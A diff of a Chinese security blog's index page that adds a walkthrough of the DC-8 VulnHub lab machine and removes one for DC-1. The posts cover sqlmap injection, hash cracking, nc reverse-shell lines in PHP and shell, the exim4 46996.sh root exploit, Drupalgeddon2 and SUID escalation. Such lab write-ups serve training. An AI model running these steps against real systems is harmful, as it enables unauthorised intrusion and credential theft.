@@ -152,6 +152,174 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-DC8靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/27/DC8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">DC8靶机渗透记录</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/27/DC8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2021-02-27T07:17:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <center>DC8靶机渗透记录</center>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>直接上结果</p>
+<p><img src="/images/image-20210227115537834.png" alt="image-20210227115537834"></p>
+<p><code>192.168.8.120</code>为VM平台，也即目标靶机，本机ip<code>182.168.8.121</code></p>
+<p><img src="/images/image-20210227121043178.png" alt="image-20210227121043178"></p>
+<p>经典22，80端口，apache服务</p>
+<p><img src="/images/image-20210227121137096.png" alt="image-20210227121137096"></p>
+<p>drupal的CMS，目录扫描部分结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[12:13:08] 200 -    3KB - &#x2F;install.php </span><br><span class="line">[12:13:10] 301 -  234B  - &#x2F;misc  -&gt;  http:&#x2F;&#x2F;192.168.8.120&#x2F;misc&#x2F;</span><br><span class="line">[12:13:10] 301 -  237B  - &#x2F;modules  -&gt;  http:&#x2F;&#x2F;192.168.8.120&#x2F;modules&#x2F;                  </span><br><span class="line">[12:13:11] 200 -    7KB - &#x2F;node                                                                        [12:13:13] 301 -  238B  - &#x2F;profiles  -&gt;  http:&#x2F;&#x2F;192.168.8.120&#x2F;profiles&#x2F;</span><br><span class="line">[12:13:14] 200 -    2KB - &#x2F;robots.txt</span><br><span class="line">[12:13:14] 301 -  237B  - &#x2F;scripts  -&gt;  http:&#x2F;&#x2F;192.168.8.120&#x2F;scripts&#x2F;</span><br><span class="line">[12:13:15] 301 -  235B  - &#x2F;sites  -&gt;  http:&#x2F;&#x2F;192.168.8.120&#x2F;sites&#x2F;         </span><br><span class="line">[12:13:17] 301 -  236B  - &#x2F;themes  -&gt;  http:&#x2F;&#x2F;192.168.8.120&#x2F;themes&#x2F;  </span><br><span class="line">[12:13:18] 200 -    8KB - &#x2F;user         </span><br><span class="line">[12:13:18] 200 -    8KB - &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">[12:13:18] 200 -    8KB - &#x2F;user&#x2F;       </span><br><span class="line">[12:13:18] 200 -    2KB - &#x2F;web.config</span><br><span class="line">[12:13:19] 200 -   42B  - &#x2F;xmlrpc.php </span><br></pre></td></tr></table></figure>
+<p>先康康robots.txt文件</p>
+<p><img src="/images/image-20210227122359070.png" alt="image-20210227122359070"></p>
+<p>挺好的，还出来了登录页面<code>/user/login</code>，其他的没权限康</p>
+<h2 id="寻找利用点"><a href="#寻找利用点" class="headerlink" title="寻找利用点"></a>寻找利用点</h2><p>这时候注意到一个小细节</p>
+<p><img src="/images/image-20210227122542823.png" alt="image-20210227122542823"></p>
+<p>首页的Details点开会传GET参数nid，随手试了试<code>/?nid=1&#39;</code>发现回传页面不一样！</p>
+<p><img src="/images/image-20210227122659122.png" alt="image-20210227122659122"></p>
+<p>SQL注入！终于刷到了QAQ</p>
+<p>这里图省事，sqlmap跑一波，先爆出数据库名儿（吐槽一下这不是dc8吗为啥要叫d7）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u &lt;url&gt;/?nid=1 --dbs </span><br></pre></td></tr></table></figure>
+<ol>
+<li>sqlmap python3 sqlmap.py -u <url>/？id=1 –dbs                                               查询数据库的库名</li>
+<li>sqlmap python3 sqlmap.py -u <url> -D 数据库名 –tables                                     查询数据库的表名</li>
+<li>sqlmap python3 sqlmap.py -u <url> -D 数据库名 -T 表名 –column                       查找字段</li>
+<li>sqlmap python3 sqlmap.py -u <url> -D 数据库名 -T 表名 -C flag –dump              可显示flag</li>
+</ol>
+<p><img src="/images/image-20210227123327238.png" alt="image-20210227123327238"></p>
+<p>这两个数据库都分别进行查询其中在d7db库中发现了<code>users</code>的表，展开发现结果如下</p>
+<p><img src="/images/image-20210227124102705.png" alt="image-20210227124102705"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u &lt;url&gt;/?nid=1 -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210227124350621.png" alt="image-20210227124350621"></p>
+<p>好家伙，，，爆是爆出来了，但是$S$说明它用的是自己定义脚本进行的hash转换。。。也就是说我们仅仅知道了用户名儿</p>
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th align="center">password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin</td>
+<td align="center">$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</td>
+</tr>
+<tr>
+<td>john</td>
+<td align="center">$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</td>
+</tr>
+</tbody></table>
+<p>那现在就有俩思路</p>
+<ol>
+<li>直接去web爆破admin和john的账号密码</li>
+<li>使用<code>john the rapper</code>进行爆破这个哈希值</li>
+</ol>
+<p><img src="/images/image-20210227133122901.png" alt="image-20210227133122901"></p>
+<p>john the rapper解出来了john的密码<code>john:turtle</code>。</p>
+<p>hydra爆破也走了一波，，，哪怕我开了12线程，用kali自带rockyou.txt也非常慢，，，</p>
+<p>所以直接走登录吧</p>
+<p><img src="/images/image-20210227140123740.png" alt="image-20210227140123740"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录上去后，发现contact us的页面是可以修改编辑的，自然想到使用php格式写入一句话木马连webshell</p>
+<p><img src="/images/image-20210227141301381.png" alt="image-20210227141301381"></p>
+<p>因为上传之后没有上传的地址，所以webshell先暂时搁置</p>
+<p>这里需要用户再次提交信息，才能触发php代码</p>
+<p>那换一种方式</p>
+<p>直接反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;nc -e /bin/bash 192.168.8.120 7777&quot;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210227142557185.png" alt="image-20210227142557185"></p>
+<p>OK，有了！</p>
+<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>先检查SUID，确实有几个可以思考的方向，先码着</p>
+<p><img src="/images/image-20210227143319450.png" alt="image-20210227143319450"></p>
+<p>在输入<code>sudo -l</code>，康康www-data有哪些无密码的root权限，发现并没有，但这算提示吗，虽然我看不懂</p>
+<p><img src="/images/image-20210227143619470.png" alt="image-20210227143619470"></p>
+<p>先试试exim4吧，46996.sh这个脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/image-20210227143916923.png" alt="image-20210227143916923"></p>
+<p>诶，4.89好像符合诶</p>
+<p>直接nc上传文件，同样还是在/tmp文件夹下，因为该文件夹权限较大</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">kali</span></span><br><span class="line">nc -lnvp 1234 &lt; 46996.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">靶机</span></span><br><span class="line">nc 192.168.8.121 1234 &gt; 46996.sh</span><br></pre></td></tr></table></figure>
+<p><code>chmod +x 46996.sh</code>给权限，留待使用</p>
+<p>这个地方直接在/tmp文件下运行脚本会显示一个很奇怪的错误，这里参考了eson的文章：</p>
+<blockquote>
+<p>exp的文本格式是 dos文件的格式 然后linux的格式是不能跑的</p>
+<p>因为dos格式编写的是 CRLF 而mac是CR unix是LF</p>
+<p>所以多出来的CR \r会导致命令执行错误 并且 在检查文件的时候 并不会看到 （这种字符是不可见的非打印字符）</p>
+</blockquote>
+<p>解决方法是</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/\r//&#x27;</span> 46996.sh</span><br></pre></td></tr></table></figure>
+<p>之后再使用netcat方式提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash 46996.sh -m netcat</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210227150359640.png" alt="image-20210227150359640"></p>
+<p>getshell！</p>
+<p><img src="/images/image-20210227150551740.png" alt="image-20210227150551740"></p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>之后我测试了一下一句话，确实不是<code>/node/3/done</code>这个位置，也就是说，没有上传的位置，就无法连接webshell。</p>
+<p>OK，DC系列应该只剩下一个DC-9了，加油ヾ(◍°∇°◍)ﾉﾞ</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/27/DC8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DC7靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -233,7 +401,7 @@
 <p>这里提权我有一个小小的疑问，放尾声说，因为该脚本一定时间就会执行，所以可以直接再次nc反弹一个shell到kali上，那也就是</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.1.11 777&quot; &gt; /opt/scripts/backups.sh#直接覆盖</span><br></pre></td></tr></table></figure>
 <p>OK，等待了一会儿，有了回弹shell</p>
-<p><img src="/mages/image-20210223231606069.png" alt="image-20210223231606069"></p>
+<p><img src="/images/image-20210223231606069.png" alt="image-20210223231606069"></p>
 <p>果然是root！</p>
 <p><img src="/images/image-20210223231736953.png" alt="image-20210223231736953"></p>
 <p>XD</p>
@@ -1385,172 +1553,6 @@ include($_GET[test]);
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/01/28/web-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-DC1靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/27/DC1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">DC1靶机渗透记录</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/27/DC1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  	<time datetime="2021-01-26T18:42:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <center>DC1靶机渗透实战</center>
-
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先靶机与测试机通过桥接模式同在一个局域网下，在测试机中输入<code>netdiscover</code>发现目标ip地址和mac地址如下</p>
-<p><img src="/images/image-20210127000425846.png" alt="image-20210127000425846"></p>
-<p>其中<code>192.168.1.9</code>即为目标，接下来nmap端口扫描一波</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -sC 192.168.1.9 &gt; DC1.txt</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="/images/image-20210127000720780.png" alt="image-20210127000720780"></p>
-<p>观察可知，对方开放了22（ssh）,80（http）等服务，我们先从80端口访问获取些信息。</p>
-<p><img src="/images/image-20210127001020601.png" alt="image-20210127001020601"></p>
-<p>同时dirsearch跑一跑目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://192.168.1.9/ -e*</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210127002320324.png" alt="image-20210127002320324"></p>
-<p>发现其存在/robots.txt文件，我们把其信息保存下来</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.9/robots.txt &gt; DC1_robots.txt</span><br></pre></td></tr></table></figure>
-<p>我们发现其中一个UPGRADE.txt文件，确定其CMS为<code>drupal</code>(没听过)，版本大概6.x。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>打开msf然后搜索该CMS有了发现</p>
-<p><img src="/images/image-20210127003044619.png" alt="image-20210127003044619"></p>
-<p>接下来就是msf的使用了，使用如下命令行，选择对应的exp进行设置</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search drupal</span><br><span class="line">use explote/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.1.9</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p>直接回弹shell</p>
-<p><img src="/images/image-20210127003806322.png" alt="image-20210127003806322"></p>
-<p>此刻拿到了shell但无root权限，进入/home目录发现一个flag4的文件夹，进入有一个flag4.txt文件，打开是以句话</p>
-<p><img src="/images/image-20210127004146958.png" alt="image-20210127004146958"></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>对于该linux内核，提权想到用上次的<code>linpeas.sh</code>脚本，将其上传至靶机</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload /home/xxx/linpeas.sh //home//flag4 #双斜杠上传</span><br><span class="line"><span class="meta">#</span><span class="bash">也可以</span></span><br><span class="line">cd /tmp</span><br><span class="line">upload /home/xxx/linpeas.sh /tmp</span><br><span class="line">chmod +x linpeas.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210127005628998.png" alt="image-20210127005628998"></p>
-<p><strong>结果！夭寿了，Unknown Command bash！</strong></p>
-<p>才发现自己挂着<code>meterpreter</code>无法完成一些操作，要输入<code>shell</code>转换成正常用户进行，这时候在<code>/var/www</code>（也就是日进来的初始位置）处发现一个我们并未扫出来的<code>flag1.txt</code></p>
-<p><img src="/images/image-20210127011524944.png" alt="image-20210127011524944"></p>
-<p>该非交互式shell不方便，查询后使用如下命令进入一个交互式的shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p>然后就是常提到的<code>suid</code>提权，先找到一个<code>root</code>有<code>x</code>权限的文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>其中在<code>/usr/bin/find</code>处可以试试find提权</p>
-<p><img src="/images/image-20210127012301691.png" alt="image-20210127012301691"></p>
-<p>有x权限！</p>
-<p>接下来使用命令进行提权</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find test -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
-<p>要注意其中<strong>test为该目录下可找到的文件！</strong>若无权限情况下可用<code>mkdir</code>试试，然后不要漏掉任何一个符号。</p>
-<p><img src="/images/image-20210127013410496.png" alt="image-20210127013410496"></p>
-<p>至此提权完成，root用户</p>
-<h2 id="查找其他flag文件"><a href="#查找其他flag文件" class="headerlink" title="查找其他flag文件"></a>查找其他flag文件</h2><p><img src="/images/image-20210127013746652.png" alt="image-20210127013746652"></p>
-<p>在无root权限下无法打开的<code>/var/www/sites/default</code>中的配置文件<code>settings.php</code>中发现了第二个flag</p>
-<p>&amp;账号和密码！</p>
-<p><img src="/images/image-20210127013959981.png" alt="image-20210127013959981"></p>
-<p>用mysql的连接方式连接</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210127014200330.png" alt="image-20210127014200330"></p>
-<p>进入其中，首先查询数据库名，<strong>一定要记着带上”;”符号！</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES; #显示查询数据库名</span><br><span class="line">USE drupaldb;#进入数据库</span><br><span class="line">select * from users;#直接将所有用户爆出来</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210127015403230.png" alt="image-20210127015403230"></p>
-<p>接下来在<code>scripts</code>文件夹下发现了一个<code>password-hash.sh</code>的脚本可以转换hash值，重设了5201314的hash值之后上传更新admin账户的密码。<strong>（$S$不属于常规的md5或者SHA -1加密，估计是其自设的加密方法，所以在其前端必定会有转换脚本，只需通过其转换脚换成自己设置的密码，即可通过前端验证）</strong>。此外，还有一种思路，msf模块中还有个添加管理员账户的exp也可使用。</p>
-<p><img src="/images/image-20210127020123557.png" alt="image-20210127020123557"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update drupaldb.users set pass&#x3D;&quot;$S$DHy2B2skKRe.&#x2F;wrVEizKU5EuQfQwZQsWkSjopftZLCs3UWHMSsGi&quot; where name&#x3D;&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
-<p>另一种，查询<code>msf</code>中针对<code>drupal</code>这种CMS的脚本</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">searchsploit drupal</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210127023331400.png" alt="image-20210127023331400"></p>
-<p>然后使用34992.py这个脚本</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.1.9 -u admin1 -p 5201314</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210127023519538.png" alt="image-20210127023519538"></p>
-<p><img src="/images/image-20210127023549393.png" alt="image-20210127023549393"></p>
-<p>于是我们登陆进来了。再其中的content模块中找到了flag3</p>
-<p><img src="/images/image-20210127023904985.png" alt="image-20210127023904985"></p>
-<h2 id="最后一个flag寻找"><a href="#最后一个flag寻找" class="headerlink" title="最后一个flag寻找"></a>最后一个flag寻找</h2><p>在flag3时我们看到了提示<code>/etc/shadow</code>和<code>/etc/passwd</code>这个路径下，我们打开看看</p>
-<p><img src="/images/image-20210129023448269.png" alt="image-20210129023448269"></p>
-<p><strong>QWQ！！！</strong></p>
-<p>一发就中，<code>/home/flag4</code>说明flag4是其一个用户，打开shadow文件康康保存的密码信息</p>
-<p><img src="/images/image-20210129023743781.png" alt="image-20210129023743781"></p>
-<p>$6$说明其采用的是SHA-512加密，好家伙，这基本上夭折了我反解密的路，虽然不抱希望还是试试cmd5</p>
-<p><img src="/images/image-20210129024018065.png" alt="image-20210129024018065"></p>
-<p>果然，那接下来就爆破吧，之前的22端口ssh服务就是个伏笔。<em>(:з」∠)</em></p>
-<p><img src="/images/image-20210129024637140.png" alt="image-20210129024637140"></p>
-<p><strong>HYDRA再立功！</strong></p>
-<p>直接登上去康康</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.1.9</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210129024850403.png" alt="image-20210129024850403"></p>
-<p>查了查flag，，，发现flag4我之前就找到了，无root情况下就找到了还能打开，，，那最后一个在哪。。。</p>
-<p>最后康了康<code>/root</code>文件夹，，，发现就在这里。。。</p>
-<p><img src="/images/image-20210129025501413.png" alt="image-20210129025501413"></p>
-<hr>
-<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>梳理一下整个过程，也觉得很奇怪hhh，为什么在meterpreter时候就可以直接康<code>/home/flag4</code>的内容？最后多跑一步爆破（虽然又爆出来了很开心），同时据说查看<code>thefinalflag.txt</code>也可以直接上传冰蝎的木马，虽然还没有尝试，但值得怀疑（因为/root需要权限，冰蝎马应该无法直接提权）。</p>
-<p>最后，就像flag里说的 <code>well down!!!!</code>。记得看到的一句话说的很对</p>
-<blockquote>
-<p>技术是无罪的，资本胁迫着开源的技术为其攫取利益。</p>
-</blockquote>
-<p>开源的的精神一直传递下来，我能从这个靶机里感受到先达者们设计的用心和对后来者的关心，总之，我玩的很开心。</p>
-<p>引用某个姐姐的一句话QWQ</p>
-<blockquote>
-<p>I hacked for fun, not for 饭</p>
-</blockquote>
-<p>加油！</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/27/DC1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
         </p>
       
 
